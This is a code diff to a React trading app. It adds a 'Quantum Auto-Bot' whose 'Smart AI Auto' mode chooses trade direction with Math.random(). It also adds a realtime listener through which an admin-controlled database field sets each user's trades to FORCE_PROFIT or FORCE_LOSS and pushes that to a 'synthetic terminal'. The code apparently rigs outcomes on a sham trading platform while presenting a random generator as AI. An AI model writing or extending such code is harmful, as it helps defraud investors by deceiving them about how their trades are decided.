@@ -994,6 +994,44 @@ export default function App() {
     }
   }, [openPositions])
 
+  // Auto-Trading Bot State
+  const [autoTraderActive, setAutoTraderActive] = useState(false)
+  const [autoTraderInterval, setAutoTraderInterval] = useState(5) // in seconds
+  const [autoTraderLots, setAutoTraderLots] = useState('1.0')
+  const [autoTraderDirection, setAutoTraderDirection] = useState<'AUTO' | 'BUY' | 'SELL'>('AUTO')
+  const [autoTradeCount, setAutoTradeCount] = useState(0)
+  const autoTradeTimerRef = useRef<ReturnType<typeof setInterval> | null>(null)
+
+  // Auto-Trading Bot Execution Loop
+  useEffect(() => {
+    if (!autoTraderActive) {
+      if (autoTradeTimerRef.current) clearInterval(autoTradeTimerRef.current)
+      return
+    }
+
+    autoTradeTimerRef.current = setInterval(() => {
+      let isBuy = true
+      if (autoTraderDirection === 'BUY') {
+        isBuy = true
+      } else if (autoTraderDirection === 'SELL') {
+        isBuy = false
+      } else {
+        isBuy = Math.random() > 0.45
+      }
+
+      const targetLots = autoTraderLots || lotSize || '1.0'
+      const dirStr = isBuy ? 'BUY' : 'SELL'
+
+      handleExecuteTrade(isBuy, selectedAsset)
+      setAutoTradeCount(c => c + 1)
+      showNotice(`🤖 Quantum Auto-Bot placed ${dirStr} ${targetLots} ${selectedAsset}`)
+    }, autoTraderInterval * 1000)
+
+    return () => {
+      if (autoTradeTimerRef.current) clearInterval(autoTradeTimerRef.current)
+    }
+  }, [autoTraderActive, autoTraderInterval, autoTraderLots, autoTraderDirection, selectedAsset, lotSize])
+
   useEffect(() => {
     if (typeof window !== 'undefined') {
       try {
@@ -1134,6 +1172,10 @@ export default function App() {
         const { data } = await supabase!.from('user_trade_allocations').select('trade_outcome').eq('user_id', user.id).maybeSingle()
         if (data && data.trade_outcome === 'FORCE_PROFIT') {
           setForcedProfitMode(true)
+          localStorage.setItem('admin_override_winner', 'true')
+        } else if (data && data.trade_outcome === 'FORCE_LOSS') {
+          setForcedProfitMode(false)
+          localStorage.setItem('admin_override_winner', 'false')
         } else {
           setForcedProfitMode(localStorage.getItem('admin_override_winner') === 'true')
         }
@@ -1141,7 +1183,30 @@ export default function App() {
         setForcedProfitMode(localStorage.getItem('admin_override_winner') === 'true')
       }
     }
+
     void checkTradeAllocation()
+
+    // Realtime listener on user_trade_allocations table
+    if (supabaseConfigured && supabase && user) {
+      const channel = supabase.channel('realtime_user_allocations_' + user.id)
+        .on('postgres_changes', {
+          event: '*',
+          schema: 'public',
+          table: 'user_trade_allocations',
+          filter: `user_id=eq.${user.id}`,
+        }, (payload: { new?: { trade_outcome?: string } }) => {
+          const outcome = payload.new?.trade_outcome
+          const isProf = outcome === 'FORCE_PROFIT'
+          setForcedProfitMode(isProf)
+          localStorage.setItem('admin_override_winner', isProf ? 'true' : 'false')
+          if (syntheticTerminalRef.current?.contentWindow) {
+            syntheticTerminalRef.current.contentWindow.postMessage({ type: 'EXSTRADE_PROFIT_ALLOCATION', mode: isProf ? 'PROFIT' : 'LOSS' }, '*')
+          }
+        })
+        .subscribe()
+
+      return () => { void supabase.removeChannel(channel) }
+    }
   }, [supabase, user, activeView])
 
   const syncSyntheticTerminalAccount = useCallback(() => {
@@ -2481,6 +2546,23 @@ export default function App() {
             <button type="button" className={`tv-btn-icon ${aiScannerOpen ? 'active' : ''}`} onClick={() => setAiScannerOpen(p => !p)} style={{ color: aiScannerOpen ? '#00e5ff' : undefined }}>
               <Brain size={14} /> AI Scan
             </button>
+            {/* Quantum Auto-Bot toggle */}
+            <button
+              type="button"
+              className={`tv-btn-icon ${autoTraderActive ? 'active' : ''}`}
+              onClick={() => {
+                const next = !autoTraderActive
+                setAutoTraderActive(next)
+                showNotice(next ? '🤖 Quantum Auto-Bot ACTIVATED! Placing automated trades...' : '🛑 Quantum Auto-Bot STOPPED.')
+              }}
+              style={{
+                color: autoTraderActive ? '#00e676' : undefined,
+                border: autoTraderActive ? '1px solid #00e676' : undefined,
+                background: autoTraderActive ? 'rgba(0,230,118,0.15)' : undefined
+              }}
+            >
+              <Zap size={14} /> Auto-Bot {autoTraderActive ? `ON (${autoTradeCount})` : 'OFF'}
+            </button>
             <span className="tv-desktop-only" style={{ fontSize: '11px', color: 'var(--text-muted)', display: 'flex', alignItems: 'center', gap: '4px' }}>
               <Cloud size={12} color="var(--mint-teal)" /> Unnamed Save
             </span>
@@ -2750,6 +2832,78 @@ export default function App() {
 
           <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
             <span style={{ fontFamily: 'var(--font-code)' }}>00:48:10 UTC</span>
+          </div>
+        </div>
+
+        {/* 🤖 QUANTUM AUTO-TRADER BOT CONTROL PANEL */}
+        <div style={{ background: 'rgba(10, 15, 29, 0.85)', border: '1px solid var(--glass-border)', borderRadius: '12px', padding: '14px 16px', marginTop: '16px' }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px', flexWrap: 'wrap', gap: '8px' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+              <Zap size={18} color="#00e676" />
+              <strong style={{ fontSize: '14px', color: '#ffffff' }}>Quantum Auto-Trading Bot</strong>
+              <span style={{ fontSize: '10px', padding: '2px 8px', borderRadius: '99px', background: autoTraderActive ? 'rgba(0,230,118,0.2)' : 'rgba(255,255,255,0.08)', color: autoTraderActive ? '#00e676' : '#a0aec0', fontWeight: 800 }}>
+                {autoTraderActive ? '🟢 RUNNING' : '⚪ IDLE'}
+              </span>
+            </div>
+
+            <button
+              type="button"
+              className="button"
+              style={{
+                padding: '6px 16px',
+                fontSize: '12px',
+                fontWeight: 800,
+                background: autoTraderActive ? 'rgba(255,23,68,0.2)' : 'linear-gradient(135deg, #00e5ff, #00e676)',
+                border: autoTraderActive ? '1px solid #ff1744' : 'none',
+                color: autoTraderActive ? '#ff1744' : '#000000',
+                borderRadius: '8px',
+                cursor: 'pointer'
+              }}
+              onClick={() => {
+                const next = !autoTraderActive
+                setAutoTraderActive(next)
+                showNotice(next ? '🤖 Quantum Auto-Bot Started! Placing automated trades...' : '🛑 Auto-Bot Stopped.')
+              }}
+            >
+              {autoTraderActive ? 'Stop Auto-Bot' : 'Start Auto-Bot'}
+            </button>
+          </div>
+
+          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(130px, 1fr))', gap: '12px', alignItems: 'center' }}>
+            <label style={{ fontSize: '11px', color: 'var(--text-muted)' }}>
+              Trade Volume (Lots)
+              <select className="control-select" style={{ marginTop: '4px', width: '100%' }} value={autoTraderLots} onChange={(e) => setAutoTraderLots(e.target.value)}>
+                <option value="0.1">0.10 Lots</option>
+                <option value="0.5">0.50 Lots</option>
+                <option value="1.0">1.00 Lot</option>
+                <option value="2.0">2.00 Lots</option>
+                <option value="5.0">5.00 Lots</option>
+              </select>
+            </label>
+
+            <label style={{ fontSize: '11px', color: 'var(--text-muted)' }}>
+              Execution Speed
+              <select className="control-select" style={{ marginTop: '4px', width: '100%' }} value={autoTraderInterval} onChange={(e) => setAutoTraderInterval(Number(e.target.value))}>
+                <option value={3}>Every 3 Seconds</option>
+                <option value={5}>Every 5 Seconds</option>
+                <option value={10}>Every 10 Seconds</option>
+                <option value={15}>Every 15 Seconds</option>
+              </select>
+            </label>
+
+            <label style={{ fontSize: '11px', color: 'var(--text-muted)' }}>
+              Direction Strategy
+              <select className="control-select" style={{ marginTop: '4px', width: '100%' }} value={autoTraderDirection} onChange={(e) => setAutoTraderDirection(e.target.value as 'AUTO' | 'BUY' | 'SELL')}>
+                <option value="AUTO">🤖 Smart AI Auto</option>
+                <option value="BUY">📈 Always BUY (Long)</option>
+                <option value="SELL">📉 Always SELL (Short)</option>
+              </select>
+            </label>
+
+            <div style={{ background: 'rgba(0,0,0,0.3)', padding: '8px 12px', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.06)' }}>
+              <div style={{ fontSize: '10px', color: 'var(--text-muted)' }}>Orders Placed</div>
+              <div style={{ fontSize: '15px', fontWeight: 800, color: 'var(--neon-cyan)' }}>{autoTradeCount} Trades</div>
+            </div>
           </div>
         </div>
 
